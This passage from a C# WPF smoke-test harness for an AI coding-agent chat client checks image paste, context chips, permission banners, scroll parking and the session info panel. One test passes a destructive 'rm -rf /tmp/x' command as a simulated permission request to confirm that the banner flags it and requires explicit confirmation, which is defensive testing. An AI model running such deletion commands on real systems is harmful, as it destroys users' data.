            var before = vm.PendingContexts.Count;
            // BY ID, not "the first available one". This phase is about the debug capture — it asserts
            // that capture's own text — and the menu's order is a design decision that has already
            // changed once. A positional pick would silently start testing a different source.
            var available = vm.ContextSources.FirstOrDefault(
                c => c.Source.Id == HostPromptBlocks.DebugState.Name && c.IsAvailable);
            available?.Command.Execute(null);
            await Task.Yield();

            var chip = vm.PendingContexts.LastOrDefault();
            var attached = vm.PendingContexts.Count == before + 1
                && chip is { CanRemove: true }
                && chip.Label.Length > 0
                && chip.Text.Contains("Recurse", StringComparison.Ordinal)
                // Not cut: the chip's peek is a display bound, the text is the payload (issue #83).
                && chip.ToBlock() is { } block
                // Fenced on the wire, so the tag carries a nonce: the prefix up to it is what is
                // stable. The reader-side pin is in HostPromptBlockTests.
                && block.StartsWith("<" + HostPromptBlocks.DebugState.Name + "-", StringComparison.Ordinal);

            // A capture alone is a whole message, exactly as an image is.
            var gatesSend = vm.SendCommand.CanExecute(null);

            // The Output-window capture, end to end through the registration rather than through the
            // Core formatter its unit tests drive. What is pinned here is the seam between them: the
            // source is registered under the block's own name, and the chip it produces reaches the
            // WIRE as an <output-window> block with its provenance line intact. A capture whose
            // provenance was lost between the formatter and ToBlock would leave the agent reasoning
            // from a fragment it had not been told was one, which is the whole point of the feature.
            await vm.AddContextAsync(HostPromptBlocks.OutputWindow.Name).ConfigureAwait(true);
            var outputChip = vm.PendingContexts.LastOrDefault(c => c.Kind == HostPromptBlocks.OutputWindow.Name);
            var outputBlock = outputChip?.ToBlock() ?? string.Empty;
            var capturedOutput = outputChip is { CanRemove: true }
                && outputChip.Label.StartsWith("Output: Build ·", StringComparison.Ordinal)
                && outputBlock.StartsWith("<" + HostPromptBlocks.OutputWindow.Name + "-", StringComparison.Ordinal)
                && outputBlock.Contains("Captured: the last ", StringComparison.Ordinal)
                && outputBlock.Contains("ask for it rather than concluding it is absent", StringComparison.Ordinal)
                // The newest lines, not the oldest: the error at the end of a build log is the reason
                // anybody is attaching it.
                && outputBlock.Contains("error CS0103", StringComparison.Ordinal);

            // Put it back as it was found.
            outputChip?.RemoveCommand?.Execute(null);
            chip?.RemoveCommand?.Execute(null);
            await Task.Yield();

            var ok = wired && built && themed && offersImage && offersFilePath && offersDisabled
                && offersEnabled && attached && gatesSend && capturedOutput
                && vm.PendingContexts.Count == before;
            return (ok,
                $"wired={wired} items={items.Count}/{vm.ContextSources.Count + 2} themed={themed} "
                + $"image={offersImage} filePath={offersFilePath} disabled={offersDisabled} "
                + $"enabled={offersEnabled} attached={attached} gatesSend={gatesSend} "
                + $"output={capturedOutput} ({outputChip?.Label}) "
                + $"cleared={vm.PendingContexts.Count == before}");
        }

        private static async Task<(bool ok, string detail)> VerifyImagePasteAsync(ChatViewModel vm, Window window)
        {
            if (FindDescendantByName(window, "InputBox") is not System.Windows.Controls.TextBox inputBox)
                return (false, "no InputBox");

            // THE PASTE MUST BE OWNED BY THE COMMAND, not by DataObject.Pasting. A screen capture puts
            // no text form on the clipboard at all, and WPF then never raises that event — so a build
            // relying on it does nothing on Ctrl+V and greys the context menu's Paste out. This check
            // asserted the wrong thing first: it synthesized a data object carrying a UnicodeText path
            // alongside the PNG, which made the pasting handler reachable and the feature look fine
            // while it was broken for the one clipboard shape the issue is about.
            var ownsPasteCommand = inputBox.CommandBindings
                .OfType<System.Windows.Input.CommandBinding>()
                .Any(b => b.Command == System.Windows.Input.ApplicationCommands.Paste);

            // IMAGE ONLY — exactly what Snipping Tool publishes ("Bitmap, System.Drawing.Bitmap, PNG",
            // measured). Driven through the seam the command's Executed handler runs on, because a
            // self-check must not write to the real clipboard.
            var imageOnly = new DataObject();
            imageOnly.SetData("PNG", new MemoryStream(EncodePng(64, 48)));
            var chatView = FindDescendantOfType<CodeWicket.UI.Views.ChatView>(window);
            var attached = chatView is not null && chatView.TryPasteImageFrom(imageOnly);

            // And the mixed shape (an Explorer copy, a browser copy): the image still wins, so a path
            // never lands in the box beside the chip.
            var mixed = new DataObject();
            mixed.SetData("PNG", new MemoryStream(EncodePng(48, 48)));
            mixed.SetData(DataFormats.UnicodeText, "C:\\somewhere\\screenshot.png");
            var mixedTaken = chatView is not null && chatView.TryPasteImageFrom(mixed);
            var textUntouched = string.IsNullOrEmpty(vm.InputText);

            // And the picker's own seam ("Add - Image..."), which must end in the SAME chip: the file
            // dialog cannot be summoned from a check, so what is driven is everything under it. A
            // separate route to an attachment is a second place for the wire path to rot, so this
            // asserts the attachment it produced, not merely that the call returned true.
            var pickedDir = HostScratch.ResolveDir("smoke-pick");
            var pickedPath = Path.Combine(pickedDir, "picked.png");
            File.WriteAllBytes(pickedPath, EncodePng(40, 32));
            var beforePick = vm.PendingAttachments.Count;
            var picked = chatView is not null && chatView.TryAttachImageFile(pickedPath)
                && vm.PendingAttachments.Count == beforePick + 1
                && vm.PendingAttachments[vm.PendingAttachments.Count - 1] is { } pickedChip
                && pickedChip.Name == "picked.png"
                && pickedChip.MimeType == "image/png";

            // A file that is not an image must be REFUSED, or the picker attaches nothing and says
            // nothing - the failure the caller's message exists to report.
            var notAnImage = Path.Combine(pickedDir, "not-an-image.png");
            File.WriteAllText(notAnImage, "%PDF-1.7 not a picture at all");
            var refused = chatView is not null && !chatView.TryAttachImageFile(notAnImage)
                && vm.PendingAttachments.Count == beforePick + 1;

            // Back to a single attachment: the rest of this check is about one. A chip's RemoveCommand
            // is nullable by design (Attachments.cs), and clicking it is the only route the strip
            // offers, so a chip without one — or one whose click leaves the strip the same length —
            // cannot be cleared here. Stop and report it: the loop as written spun the UI thread
            // forever, turning a nameable failure into the gate's own timeout (#247).
            var trimmed = true;
            while (vm.PendingAttachments.Count > 1)
            {
                var last = vm.PendingAttachments[vm.PendingAttachments.Count - 1];
                var before = vm.PendingAttachments.Count;
                last.RemoveCommand?.Execute(null);
                if (vm.PendingAttachments.Count >= before)
                {
                    trimmed = false;
                    break;
                }
            }

            // Let the chip's template instantiate before looking for it.
            await Task.Delay(50).ConfigureAwait(true);
            window.UpdateLayout();

            var chipRendered = FindDescendantOfType<System.Windows.Controls.Image>(
                window, i => i.DataContext is AttachmentViewModel) is not null;

            // And the bubble's own template, which is a different one: send it and look again.
            vm.InputText = "what is wrong with this?";
            vm.SendCommand.Execute(null);
            await Task.Delay(150).ConfigureAwait(true);
            window.UpdateLayout();

            var message = vm.Items.OfType<MessageItemViewModel>().LastOrDefault(m => m.IsUser);
            var messageCarriesIt = message is { HasAttachments: true };
            var stripCleared = !vm.HasPendingAttachments;
            // Written only when the message was sent — a paste the user removes must leave no file.
            var saved = message?.Attachments.FirstOrDefault()?.FilePath;
            var savedToDisk = saved is { Length: > 0 } && File.Exists(saved);

            var ok = ownsPasteCommand && attached && mixedTaken && textUntouched && chipRendered
                     && picked && refused && trimmed && messageCarriesIt && stripCleared && savedToDisk;
            return (ok,
                $"ownsPasteCommand={ownsPasteCommand} imageOnly={attached} mixed={mixedTaken} "
                + $"textUntouched={textUntouched} chip={chipRendered} picked={picked} "
                + $"refusedNonImage={refused} trimmedToOne={trimmed} onMessage={messageCarriesIt} "
                + $"cleared={stripCleared} saved={saved}");
        }

        /// <summary>A real PNG of the given size, so the decode under test is a decode of actual bytes.</summary>
        private static byte[] EncodePng(int width, int height)
        {
            var stride = width * 4;
            var pixels = new byte[stride * height];
            for (var i = 0; i < pixels.Length; i += 4)
            {
                pixels[i] = 0x40;      // B
                pixels[i + 1] = 0x80;  // G
                pixels[i + 2] = 0xC0;  // R
                pixels[i + 3] = 0xFF;  // A
            }

            var source = System.Windows.Media.Imaging.BitmapSource.Create(
                width, height, 96, 96, System.Windows.Media.PixelFormats.Bgra32, null, pixels, stride);
            var encoder = new System.Windows.Media.Imaging.PngBitmapEncoder();
            encoder.Frames.Add(System.Windows.Media.Imaging.BitmapFrame.Create(source));
            using var output = new MemoryStream();
            encoder.Save(output);
            return output.ToArray();
        }

        private static async Task<(bool ok, string detail)> VerifyParallelPermissionsAsync(ChatViewModel vm)
        {
            static PermissionRequestDto Req(string id, string title) => new PermissionRequestDto(
                id, title, "execute", title, title,
                new[] { new PermissionOptionDto("allow_once", "Allow", "AllowOnce") });

            var taskA = vm.RequestPermissionAsync(Req("pa", "Parallel A"));
            var taskB = vm.RequestPermissionAsync(Req("pb", "Parallel B"));

            // Both are enqueued now; the first is the visible head, the second waits behind it.
            var firstShownOk = vm.PendingPermission?.Title == "Parallel A";

            // Answer whichever banner is currently up until both requests resolve (or we give up).
            for (var i = 0; i < 80 && !(taskA.IsCompleted && taskB.IsCompleted); i++)
            {
                var banner = vm.PendingPermission;
                var opt = banner?.Options.FirstOrDefault(o => o.IsAllow) ?? banner?.Options.FirstOrDefault();
                opt?.Command.Execute(null);
                await Task.Delay(25).ConfigureAwait(true);
            }

            var both = taskA.IsCompleted && taskB.IsCompleted;
            var decA = taskA.IsCompleted ? (await taskA.ConfigureAwait(true)).OptionId : "(pending)";
            var decB = taskB.IsCompleted ? (await taskB.ConfigureAwait(true)).OptionId : "(pending)";
            var cleared = vm.PendingPermission is null;
            var ok = both && firstShownOk && cleared && decA == "allow_once" && decB == "allow_once";
            return (ok, $"firstShown={firstShownOk} a={decA} b={decB} cleared={cleared}");
        }

        // Session-switch cleanup: a permission still pending when the user switches/opens a new session
        // must NOT survive. We enqueue a request (leave it unanswered), start a new session, then assert
        // the banner is gone AND the stranded request resolved as cancelled — so the old backend's blocked
        // request_permission unblocks instead of hanging. Guards the stale-banner bug where a previous
        // session's prompt (e.g. Kiro's four-option "Deny always" set) lingered over a freshly-switched one.
        private static async Task<(bool ok, string detail)> VerifyPermissionClearedOnSessionSwitchAsync(ChatViewModel vm)
        {
            var task = vm.RequestPermissionAsync(new PermissionRequestDto(
                "sw1", "Pending from old session", "execute", "old", "old cmd",
                new[] { new PermissionOptionDto("allow_once", "Allow", "AllowOnce") }));

            var shown = vm.PendingPermission?.ToolCallId == "sw1";

            vm.NewSessionCommand.Execute(null); // -> ClearTranscript -> ClearPermissionQueue

            for (var i = 0; i < 40 && !task.IsCompleted; i++)
                await Task.Delay(25).ConfigureAwait(true);

            var cleared = vm.PendingPermission is null;
            var cancelled = task.IsCompleted && (await task.ConfigureAwait(true)).Cancelled;
            var ok = shown && cleared && cancelled;
            return (ok, $"shown={shown} cleared={cleared} cancelled={cancelled}");
        }

        // Flagged (sensitive / always-prompt) permission: the banner must flag it, DROP "Allow always"
        // entirely, and gate a one-time Allow behind an explicit confirm step (the anti-fat-finger design).
        /// <summary>
        /// A pending permission parks the view on the row it is about — but only when the transcript is
        /// following, and without ever claiming the USER stopped following.
        /// <para>Four claims, and the last two are the ones a view-model test cannot make at all, since
        /// the whole subject is a scroll offset in a real virtualising panel:</para>
        /// <list type="number">
        /// <item>following + prompt ⇒ the view leaves the bottom (it went to the row);</item>
        /// <item>the follow flag is NOT cleared — no jump-to-latest pill, because the user did nothing;</item>
        /// <item>answering rides back down to the newest content with no "resume" step;</item>
        /// <item>scrolled away + prompt ⇒ the view does NOT move, because they are reading something.</item>
        /// </list>
        /// <para>
        /// Its target is the FIRST tool row, so the park is a long move UP and its end state is
        /// unambiguous. That also bounds what this phase can see: a row reached from below lands at the
        /// TOP of the viewport with the rest of it as slack, so nothing about the row's BOTTOM edge is at
        /// stake here. <see cref="VerifyParkOnLastRowAsync"/> is the phase for that (issue #218), and
        /// it needs a target this one cannot use.
        /// </para>
        /// </summary>
        private static async Task<(bool ok, string detail)> VerifyPromptParkAsync(
            ChatViewModel vm, Window window, CodeWicket.UI.Views.ChatView view)
        {
            var scroll = view.TranscriptScrollForDiagnostics;
            if (scroll is null)
                return (false, "no transcript scroller");

            // Park needs something to scroll to, and a transcript long enough that the row is not
            // already at the bottom. The fake's turn has both by the time this runs.
            var target = vm.Items.OfType<ToolItemViewModel>().FirstOrDefault();
            if (target is null)
                return (false, "no tool row to park on");

            static PermissionOptionDto[] Options() => new[]
            {
                new PermissionOptionDto("allow_once", "Allow", "AllowOnce"),
                new PermissionOptionDto("reject_once", "Deny", "RejectOnce"),
            };

            view.JumpToLatestForDiagnostics();
            window.UpdateLayout();
            await Task.Delay(60).ConfigureAwait(true);
            var startedAtBottom = scroll.VerticalOffset >= scroll.ScrollableHeight - 4;

            // (1) + (2): following, so the pane parks itself.
            var task = vm.RequestPermissionAsync(new PermissionRequestDto(
                target.ToolCallId, "Running: echo parked", "execute", "echo parked", "echo parked", Options()));
            window.UpdateLayout();
            await Task.Delay(120).ConfigureAwait(true);
            var moved = scroll.VerticalOffset < scroll.ScrollableHeight - 4;
            var keptFollowing = !view.ShowJumpToLatest;
            var parkedOffset = scroll.VerticalOffset;

            // (3): answering releases the park and rides back down.
            vm.PendingPermission?.Options.FirstOrDefault(o => o.Kind == "AllowOnce")?.Command.Execute(null);
            for (var i = 0; i < 40 && !task.IsCompleted; i++)
                await Task.Delay(25).ConfigureAwait(true);
            window.UpdateLayout();
            await Task.Delay(120).ConfigureAwait(true);
            var returnedToBottom = scroll.VerticalOffset >= scroll.ScrollableHeight - 4;

            // Captured WITH its denominator, at the moment it was asserted. The transcript keeps
            // growing, so reading ScrollableHeight at the end prints a bottom that was never the one
            // this compared against — a detail line that argues with its own verdict.
            var returnedOffset = scroll.VerticalOffset;
            var returnedExtent = scroll.ScrollableHeight;

            // (4): scrolled away, the pane must leave them exactly where they are.
            // Raised as a real WHEEL gesture, not ScrollToVerticalOffset. The transcript takes "the user
            // is scrolling" from the INPUT (issue #90), so a bare offset move is not a gesture at all —
            // it is corrected straight back to the bottom, and a harness making one would be testing a
            // path no user can take. This cost a FAIL before it was noticed, which is the point of
            // reading what the check actually produced rather than what it was expected to.
            var itemsEl = FindDescendantOfType<CodeWicket.UI.Controls.TranscriptItemsControl>(window)
                ?? (FrameworkElement)view;
            // All the way to the TOP, deliberately. Six notches left the view near where the park
            // target sits, so "stayed put" was true of a yank as well as of leaving them alone — the
            // check passed with the guard removed. A resting place the park would visibly move us AWAY
            // from is what makes the assertion mean anything.
            for (var i = 0; i < 60 && scroll.VerticalOffset > 0; i++)
            {
                itemsEl.RaiseEvent(new System.Windows.Input.MouseWheelEventArgs(
                    System.Windows.Input.Mouse.PrimaryDevice, Environment.TickCount, 120)
                {
                    RoutedEvent = UIElement.PreviewMouseWheelEvent,
                });
                scroll.RaiseEvent(new System.Windows.Input.MouseWheelEventArgs(
                    System.Windows.Input.Mouse.PrimaryDevice, Environment.TickCount, 120)
                {
                    RoutedEvent = UIElement.MouseWheelEvent,
                });
                // Laid out per notch. A ScrollViewer applies a wheel move against the offset it has
                // ALREADY laid out, so a burst raised back-to-back lands as a couple of notches rather
                // than sixty — measured: forty raises moved 288px, exactly six notches.
                window.UpdateLayout();
            }

            await Task.Delay(80).ConfigureAwait(true);
            window.UpdateLayout();
            var awayOffset = scroll.VerticalOffset;
            var second = vm.RequestPermissionAsync(new PermissionRequestDto(
                target.ToolCallId, "Running: echo away", "execute", "echo away", "echo away", Options()));
            window.UpdateLayout();
            await Task.Delay(120).ConfigureAwait(true);
            var stayedPut = Math.Abs(scroll.VerticalOffset - awayOffset) < 1;

            vm.PendingPermission?.Options.FirstOrDefault(o => o.Kind == "AllowOnce")?.Command.Execute(null);
            for (var i = 0; i < 40 && !second.IsCompleted; i++)
                await Task.Delay(25).ConfigureAwait(true);

            // The wheel has to have MOVED us, or "stayed put" is trivially true of a view that never
            // left the bottom — the check would pass while asserting nothing.
            // Near the TOP, so a park (which lands mid-transcript on its row) could not be mistaken for
            // having left the reader alone.
            var scrolledAway = awayOffset < 50;

            var ok = startedAtBottom && moved && keptFollowing && returnedToBottom && scrolledAway && stayedPut;
            return (ok,
                $"startedAtBottom={startedAtBottom} parked={moved}@{parkedOffset:F0} keptFollowing={keptFollowing} " +
                $"returned={returnedToBottom}@{returnedOffset:F0}/{returnedExtent:F0} " +
                $"scrolledAway={scrolledAway}@{awayOffset:F0} stayedPutWhenAway={stayedPut}");
        }

        /// <summary>
        /// The reported shape of issue #218: the row being asked about is THE LAST ITEM in the
        /// transcript, which is where a permission prompt usually finds one — the call that just opened
        /// is the newest thing there is, and a following pane is looking straight at it. The claim is
        /// that after the park the row is on screen WHOLE, its bottom edge inside the viewport that
        /// exists once the permission banner has taken its own row beneath the scroller.
        /// <para>
        /// A sibling of <see cref="VerifyPromptParkAsync"/> rather than another claim inside it, because
        /// the two need targets that contradict each other. That one parks on the FIRST tool row, so the
        /// park is a long move UP whose end state is unambiguous — and a row reached from below lands at
        /// the TOP of the viewport with the whole rest of it as slack, so the row's BOTTOM edge is never
        /// at stake there. Nothing is wrong with that target; the shape it produces is the safe one,
        /// which is exactly why it cannot report on this one.
        /// </para>
        /// <para>
        /// <b>It has to MAKE the shape, by lifting the trailing edit card out and putting it back.</b>
        /// Nothing in the fake's turn is both the final item and addressable by a permission: the last
        /// item is a Kiro-style edit card, which registers no tool-call id of its own, so a prompt naming
        /// it resolves to nothing and never parks at all — measured, and the phase went green having
        /// exercised nothing. A row the harness appends itself has the same problem from the other side.
        /// So the one real, resolvable tool row nearest the end is promoted to last for the duration.
        /// </para>
        /// <para>
        /// <b>The preconditions are asserted, not assumed.</b> Every claim is about a row that is the
        /// last item, starts wholly on screen, has something above it to scroll, and is genuinely parked
        /// on; if any of those stops holding the claim goes vacuous rather than false, so each is part of
        /// the verdict and is printed with the number it was read from.
        /// </para>
        /// <para>
        /// <b>IT ONLY FAILS UNDER LOAD, and that is the most useful thing about it.</b> Run on its own
        /// through <c>run-smoke.ps1</c> the bug does not reproduce: the row lands flush (221+39 in 259)
        /// on the broken code and the fixed code alike, byte-identical, and an hour went into a wrong
        /// root cause on the strength of that agreement. Run through <c>run-gates.ps1</c>, where four
        /// gates share the machine, the same phase on the same commit puts the row at 249+39 in 259 —
        /// 29px of it below the fold, on BOTH frameworks. The park is a one-shot scroll racing a layout
        /// pass, so what decides it is whether the pass has run by the time the scroll is computed, and
        /// a quiet machine wins that race every time. <b>Verify this one under the gates, never by
        /// itself</b> — a solo green here says nothing at all.
        /// </para>
        /// </summary>
        private static async Task<(bool ok, string detail)> VerifyParkOnLastRowAsync(
            ChatViewModel vm, Window window, CodeWicket.UI.Views.ChatView view)
        {
            var scroll = view.TranscriptScrollForDiagnostics;
            if (scroll is null)
                return (false, "no transcript scroller");

            // The VIEWPORT is the ScrollContentPresenter, not the ScrollViewer: the scroller's own bounds
            // include its border and padding, so a row measured against those reads a few pixels lower
            // than it sits, and one flush with the bottom fails by exactly that offset. Measured rather
            // than carried as a tolerance — a fudge factor big enough to absorb it is big enough to
            // absorb a real overhang on a short row.
            var viewport = FindDescendantOfType<System.Windows.Controls.ScrollContentPresenter>(scroll);
            if (viewport is null)
                return (false, "no scroll content presenter (cannot locate the viewport)");

            // Geometry of one row against that viewport, or null when it is not laid out under it at all.
            (double top, double height)? Measure(object item)
            {
                if (FindDescendantOfType<FrameworkElement>(scroll, fe => ReferenceEquals(fe.DataContext, item))
                    is not { } el)
                    return null;
                try
                {
                    return (el.TransformToAncestor(viewport).Transform(default).Y, el.ActualHeight);
                }
                catch (InvalidOperationException)
                {
                    return null;
                }
            }

            // Promote the last addressable tool row to last, remembering exactly what was lifted so the
            // transcript can be put back in the same order.
            var target = vm.Items.OfType<ToolItemViewModel>().LastOrDefault();
            if (target is null)
                return (false, "no tool row to park on");
            var lifted = new List<(int Index, ChatItemViewModel Item)>();
            for (var i = vm.Items.Count - 1; i > vm.Items.IndexOf(target); i--)
                lifted.Add((i, vm.Items[i]));
            foreach (var (_, item) in lifted)
                vm.Items.Remove(item);

            try
            {
                // Rest state: following, at the end — the state a prompt actually arrives in.
                view.JumpToLatestForDiagnostics();
                await SettleAsync(window).ConfigureAwait(true);
                var startedAtBottom = scroll.VerticalOffset >= scroll.ScrollableHeight - 4;
                // ...and there IS an end to be at. With nothing to scroll every claim below is true of a
                // transcript that simply fits, which is not the situation this is about.
                var somethingToScroll = scroll.ScrollableHeight > 100;
                var isLast = ReferenceEquals(vm.Items.LastOrDefault(), target);

                var before = Measure(target);
                var viewportBefore = viewport.ActualHeight;
                var startedWhole = before is { } b && b.top >= -2 && b.top + b.height <= viewportBefore + 2;

                var task = vm.RequestPermissionAsync(new PermissionRequestDto(
                    target.ToolCallId, "Running: echo last", "execute", "echo last", "echo last",
                    new[]
                    {
                        new PermissionOptionDto("allow_once", "Allow", "AllowOnce"),
                        new PermissionOptionDto("reject_once", "Deny", "RejectOnce"),
                    }));
                await SettleAsync(window).ConfigureAwait(true);

                var bannerUp = vm.HasPendingPermission;
                var parkedOnIt = ReferenceEquals(vm.HighlightedItem, target);
                var viewportHeight = viewport.ActualHeight;
                var shrank = viewportHeight < viewportBefore;
                var after = Measure(target);
                var rowTop = after?.top ?? double.NaN;
                var rowHeight = after?.height ?? double.NaN;
                // The denominator. A row taller than the viewport is supposed to show its START instead
                // (issue #125), so on one of those "the bottom is off the end" is the designed behaviour
                // and this phase would be asserting the opposite of it.
                var rowFits = rowHeight <= viewportHeight;
                var wholeOnScreen = rowFits && rowTop >= -2 && rowTop + rowHeight <= viewportHeight + 2;

                vm.PendingPermission?.Options.FirstOrDefault(o => o.Kind == "AllowOnce")?.Command.Execute(null);
                for (var i = 0; i < 40 && !task.IsCompleted; i++)
                    await Task.Delay(25).ConfigureAwait(true);

                var ok = startedAtBottom && somethingToScroll && isLast && startedWhole
                    && bannerUp && parkedOnIt && shrank && rowFits && wholeOnScreen;
                return (ok,
                    $"startedAtBottom={startedAtBottom} toScroll={somethingToScroll}@{scroll.ScrollableHeight:F0} "
                    + $"isLast={isLast} target={target.ToolCallId} "
                    + $"startedWhole={startedWhole}@{before?.top ?? double.NaN:F0}+{before?.height ?? double.NaN:F0}/{viewportBefore:F0} "
                    + $"banner={bannerUp} parkedOnIt={parkedOnIt} shrank={shrank} "
                    + $"wholeOnScreen={wholeOnScreen}@{rowTop:F0}+{rowHeight:F0}/{viewportHeight:F0} fits={rowFits}");
            }
            finally
            {
                // Put back in the order they were lifted from, whatever happened above.
                for (var i = lifted.Count - 1; i >= 0; i--)
                    vm.Items.Insert(lifted[i].Index, lifted[i].Item);
                view.JumpToLatestForDiagnostics();
                await SettleAsync(window).ConfigureAwait(true);
            }
        }

        /// <summary>
        /// Clicking the pinned plan strip takes the user to the plan card AND STOPS THE FOLLOW
        /// (issue #180). Reported as "you need to scroll away from the bottom and then click for it to
        /// work": the click scrolled up, the ScrollChanged that scroll itself raised found the follow
        /// still set, and re-aimed straight back to the bottom — so the strip looked inert unless the
        /// user had already cleared the follow by hand.
        ///
        /// <para><b>Driven as the routed event, on the strip's own element.</b> The handler is a XAML
        /// attribute, so deleting it leaves an unused private method and a clean build while the strip
        /// does nothing at all (#62's lesson) — and calling <c>GoToItem</c> from here instead would
        /// assert the fix while stepping over the wiring that reaches it. The registration is probed as
        /// well, with the probe proven against a known-present handler first, because a raise on an
        /// unwired element is silent.</para>
        ///
        /// <para><b>Three claims, and the third is the one that says the click went somewhere USEFUL.</b>
        /// Off the bottom alone would be satisfied by a scroll to anywhere; the plan card's own container
        /// has to be in the viewport. The follow flag is read through the pill, which is its only
        /// observable — and it is the durable half: the offset says where we landed, the flag says
        /// whether the next delta will drag us off it.</para>
        ///
        /// <para>Runs against the main window's transcript because that is the only place a real plan
        /// exists — <c>ActivePlan</c> is set from a live event and there is no public way in — and
        /// leaves it as it found it (a re-pin at the end, the same restore the park check makes). The
        /// strip itself is hidden by then, the fake's plan having completed, which changes nothing about
        /// the handler under test: its own precondition is <c>ActivePlan</c>, and whether the strip is on
        /// screen while a plan is live is what the plan-card phase already reports.</para>
        /// </summary>
        private static async Task<(bool ok, string detail)> VerifyPlanStripFollowAsync(
            ChatViewModel vm, Window window, CodeWicket.UI.Views.ChatView view)
        {
            var scroll = view.TranscriptScrollForDiagnostics;
            if (scroll is null)
                return (false, "no transcript scroller");
            if (vm.ActivePlan is not { } plan)
                return (false, "no plan card");
            if (FindDescendantByName(window, "PlanBar") is not FrameworkElement strip)
                return (false, "plan strip not found");

            var probeSees = HasRoutedHandler(view, UIElement.PreviewKeyDownEvent);
            var wired = probeSees && HasRoutedHandler(strip, UIElement.MouseLeftButtonUpEvent);

            view.JumpToLatestForDiagnostics();
            window.UpdateLayout();
            await Task.Delay(60).ConfigureAwait(true);

            // The precondition IS the bug: following, parked at the bottom. Scrolled away first, the
            // strip has always worked, which is what the report says.
            var startedAtBottom = scroll.VerticalOffset >= scroll.ScrollableHeight - 4;
            var startedFollowing = !view.ShowJumpToLatest;

            strip.RaiseEvent(new System.Windows.Input.MouseButtonEventArgs(
                System.Windows.Input.Mouse.PrimaryDevice, Environment.TickCount,
                System.Windows.Input.MouseButton.Left)
            {
                RoutedEvent = UIElement.MouseLeftButtonUpEvent,
            });

            // Read AFTER the two-pass re-aim has had its turn. The second pass is dispatched at Loaded,
            // which outranks Background, so yielding there is what makes this an observation of where the
            // view SETTLED rather than a race with the snap-back this check exists to catch.
            window.UpdateLayout();
            await System.Windows.Threading.Dispatcher.Yield(System.Windows.Threading.DispatcherPriority.Background);
            window.UpdateLayout();
            await Task.Delay(120).ConfigureAwait(true);

            var movedOffBottom = scroll.VerticalOffset < scroll.ScrollableHeight - 4;
            var pillOffered = view.ShowJumpToLatest;
            var landedOffset = scroll.VerticalOffset;
            var landedExtent = scroll.ScrollableHeight;

            var showedThePlan = false;
            double planTop = double.NaN;
            if (FindDescendantByName(window, "TranscriptItems") is System.Windows.Controls.ItemsControl items
                && items.ItemContainerGenerator.ContainerFromItem(plan) is FrameworkElement card)
            {
                try
                {
                    planTop = card.TransformToAncestor(scroll).Transform(default).Y;
                    showedThePlan = planTop >= -1 && planTop < scroll.ViewportHeight;
                }
                catch (InvalidOperationException)
                {
                    // Not in the same visual branch (virtualised away mid-read); leave it false and say so.
                }
            }

            // Put the transcript back where the next phase expects it.
            view.JumpToLatestForDiagnostics();
            window.UpdateLayout();
            await Task.Delay(60).ConfigureAwait(true);

            var ok = wired && startedAtBottom && startedFollowing && movedOffBottom && pillOffered && showedThePlan;
            return (ok,
                $"wired={wired} (probe={(probeSees ? "sees" : "blind")}) startedAtBottom={startedAtBottom} "
                + $"startedFollowing={startedFollowing} movedOffBottom={movedOffBottom} "
                + $"@{landedOffset:F0}/{landedExtent:F0} pillOffered={pillOffered} "
                + $"showedThePlan={showedThePlan} (planTop={planTop:F0}, viewport={scroll.ViewportHeight:F0})");
        }

        private static async Task<(bool ok, string detail)> VerifyFlaggedPermissionAsync(ChatViewModel vm)
        {
            var task = vm.RequestPermissionAsync(new PermissionRequestDto(
                "flag1", "Running: rm -rf /tmp/x", "execute", "rm -rf /tmp/x", "rm -rf /tmp/x",
                new[]
                {
                    new PermissionOptionDto("allow_once", "Allow", "AllowOnce"),
                    new PermissionOptionDto("allow_always", "Allow always", "AllowAlways"),
                    new PermissionOptionDto("reject_once", "Deny", "RejectOnce"),
                },
                FlaggedFragment: "rm -rf"));

            var banner = vm.PendingPermission;
            var isFlagged = banner?.IsFlagged == true;
            var strippedAlways = banner is not null &&
                !banner.Options.Any(o => string.Equals(o.Kind, "AllowAlways", StringComparison.OrdinalIgnoreCase));

            // Clicking Allow (once) enters the confirm step instead of resolving.
            banner?.Options.FirstOrDefault(o => string.Equals(o.Kind, "AllowOnce", StringComparison.OrdinalIgnoreCase))
                ?.Command.Execute(null);
            var enteredConfirm = banner?.IsConfirmingAllow == true && banner.ShowOptions == false && !task.IsCompleted;

            // Confirming resolves a one-time allow.
            banner?.ConfirmFlaggedAllowCommand.Execute(null);
            for (var i = 0; i < 20 && !task.IsCompleted; i++)
                await Task.Delay(25).ConfigureAwait(true);
            var resolvedAllowOnce = task.IsCompleted && (await task.ConfigureAwait(true)).OptionId == "allow_once";

            var ok = isFlagged && strippedAlways && enteredConfirm && resolvedAllowOnce;
            return (ok, $"flagged={isFlagged} strippedAlways={strippedAlways} confirm={enteredConfirm} allowOnce={resolvedAllowOnce}");
        }

        /// <summary>
        /// The session information panel, read back over the real engine hop (issue #160).
        ///
        /// <para><b>It asserts only what a unit test structurally cannot.</b> The builder's own tests
        /// hand it inputs, so they prove the rendering and nothing about the plumbing: they stay green
        /// with <c>EngineService.SessionInfo</c> returning nothing at all, or with the pull never
        /// issued. This drives the whole path — open the popup, which is what issues the pull, and read
        /// the rows the engine's answer produced.</para>
        ///
        /// <para>The fake's handshake is deliberately MIXED (resume offered, images refused, session
        /// list never mentioned), so a wire that collapsed the unreported third into a refusal is
        /// visible here as well as in the round-trip test.</para>
        ///
        /// <para><b>What it cannot reach, stated rather than implied:</b> the fake reports a
        /// capabilities answer, so the "the agent listed no capabilities" branch never runs end to end —
        /// only the builder tests cover it. And the glyph is a screenshot's job.</para>
        /// </summary>
        private static async Task<(bool ok, string detail)> VerifySessionInfoAsync(ChatViewModel vm)
        {
            // Opening the panel is what issues the pull; before it, the engine-sourced rows honestly
            // report that they have not been read.
            //
            // WAIT FOR THE CONTENT, NOT FOR THE ROW. The rows exist from the moment a session is
            // started, carrying "not reported" and "not read yet" - so a wait keyed on a row being
            // PRESENT is satisfied by the unpopulated state and samples the panel before the engine has
            // answered. That is exactly how this check failed on its first run, with the feature
            // working: the harness supplied the pass condition.
            vm.IsSessionInfoOpen = true;
            await WaitForTranscriptAsync(
                () => vm.SessionInfo.Rows.Any(r => r.Label == "Negotiated" && r.Value != "not read yet"),
                TimeSpan.FromSeconds(10)).ConfigureAwait(true);

            var rows = vm.SessionInfo.Rows;
            var program = rows.FirstOrDefault(r => r.Label == "Agent program")?.Value;
            var negotiated = rows.FirstOrDefault(r => r.Label == "Negotiated")?.Value;
            var conversation = rows.FirstOrDefault(r => r.Label == "Conversation")?.Value;
            var copy = vm.SessionInfo.CopyText;

            vm.IsSessionInfoOpen = false;

